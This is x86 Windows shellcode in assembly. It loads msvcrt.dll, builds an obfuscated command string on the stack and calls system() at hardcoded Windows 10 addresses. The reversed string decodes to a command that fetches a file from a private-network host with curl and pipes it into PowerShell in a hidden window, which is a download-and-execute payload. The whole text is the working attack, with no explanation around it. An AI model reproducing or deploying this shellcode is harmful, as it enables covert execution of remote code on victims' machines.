xor eax, eax             ;Get the msvcrt.dll
mov ax, 0x7472           ;"tr\0\0"
push eax
push dword 0x6376736d    ;"cvsm"
push esp

; LoadLibrary
mov ebx, 0x76322990      ;Address of function LoadLibraryA (win10)
call ebx
mov ebp, eax             ;msvcrt.dll is saved in ebp

xor eax, eax             ;zero out EAX
PUSH eax                 ;NULL at the end of string
PUSH 0x6820772d			     ;push string "h w-"
PUSH 0x206c6c65		       ;push string " lle"
PUSH 0x68737265			     ;push string "hsre"
PUSH 0x776f707c			     ;push string "wop|"
PUSH 0x7478742e			     ;push string "txt."
PUSH 0x736d2f33			     ;push string "sm/3"
PUSH 0x30312e30          ;push string "01.0"
PUSH 0x2e383631          ;push string ".861"
PUSH 0x2e323931          ;push string ".291"
PUSH 0x2f2f3a70          ;push string "//:p"
PUSH 0x74746820          ;push string "tth "
PUSH 0x6c727563          ;push string "lruc"
MOV EDI,ESP              ;adding a pointer to the stack
PUSH EDI
MOV EAX,0x75ec3dc0       ;calling the system()(win10)
CALL EAX

xor eax, eax
push eax
mov eax, 0x763258f0     ; ExitProcess (win10)
call eax
